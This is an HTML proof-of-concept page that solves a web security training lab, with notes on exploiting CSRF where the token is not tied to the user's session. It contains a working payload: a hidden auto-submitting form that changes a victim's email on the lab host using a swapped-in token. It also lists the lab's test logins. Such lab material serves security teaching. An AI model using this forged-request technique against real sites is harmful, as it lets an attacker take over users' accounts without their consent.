<html>
    <body>
        <!--
            Lab #4 - CSRF where token is not tied to user session

            Vulnerable parametr - email change functionality

            Goal - exploit CSRF to change email address

            Creds - wiener:peter, carlos:montoya

            Analysis:
            In order for a CSRF attack to be possible:
            - A relevant action: change a users email
            - Cookie-based session handlinf: session cookie
            - No unpredictable request parameter: CSRF token is not tied to user session

            Testing CSRF Tokens:
            1. Remove the CSRF token and see if application accepts request
            2. Change the request method from POST to GET
            3. See if CSRF token is tied to user session
        -->
        <script>history.pushState('', '', '/')</script>
        <form action="https://ac841ffe1ef3479ec0c6d438009c006b.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="sarlot@hacker.com"/>
            <input type="hidden" name="csrf" value="ASiG7exunrpkrokWEa3UytvCaQTnGfGS"/>
            <input type="submit" value="Submit request"/>
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>


